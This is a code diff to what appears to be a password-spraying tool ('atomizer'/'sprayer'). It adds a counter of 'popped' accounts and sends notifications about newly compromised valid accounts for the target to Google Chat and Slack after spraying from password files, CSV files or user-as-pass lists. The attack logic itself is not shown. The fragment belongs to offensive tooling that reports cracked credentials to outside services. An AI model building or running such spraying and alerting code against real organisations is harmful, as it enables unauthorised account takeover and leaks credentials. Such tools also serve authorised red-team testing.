@@ -183,9 +183,8 @@ if __name__ == "__main__":
 
     if not args['--recon']:
         add_handlers(loop, atomizer.shutdown)
-
+        popped_accts = 0
         if args['--interval']:
-            popped_accts = 0
             with open(args['<passwordfile>']) as passwordfile:
                 password = passwordfile.readline()
                 while password != "":
@@ -220,6 +219,13 @@ if __name__ == "__main__":
                             password=args['<password>']
                         )
                     )
+                    if popped_accts != len(atomizer.sprayer.valid_accounts):
+                        popped_accts = len(atomizer.sprayer.valid_accounts)
+
+                        if args['--gchat']:
+                            gchat(args['--gchat'], args['<target>'], atomizer.sprayer)
+                        if args['--slack']:
+                            slack(args['--slack'], args['<target>'], atomizer.sprayer)
 
         elif args['--csvfile']:
             with open(args['--csvfile']) as csvfile:
@@ -231,9 +237,23 @@ if __name__ == "__main__":
                             pass_row_name=args['--pass-row-name']
                         )
                     )
+                    if popped_accts != len(atomizer.sprayer.valid_accounts):
+                        popped_accts = len(atomizer.sprayer.valid_accounts)
+
+                        if args['--gchat']:
+                            gchat(args['--gchat'], args['<target>'], atomizer.sprayer)
+                        if args['--slack']:
+                            slack(args['--slack'], args['<target>'], atomizer.sprayer)
 
         elif args['--user-as-pass']:
             with open(args['--user-as-pass']) as userfile:
                     loop.run_until_complete(atomizer.atomize_user_as_pass(userfile))
+                    if popped_accts != len(atomizer.sprayer.valid_accounts):
+                        popped_accts = len(atomizer.sprayer.valid_accounts)
+
+                        if args['--gchat']:
+                            gchat(args['--gchat'], args['<target>'], atomizer.sprayer)
+                        if args['--slack']:
+                            slack(args['--slack'], args['<target>'], atomizer.sprayer)
 
         atomizer.shutdown()
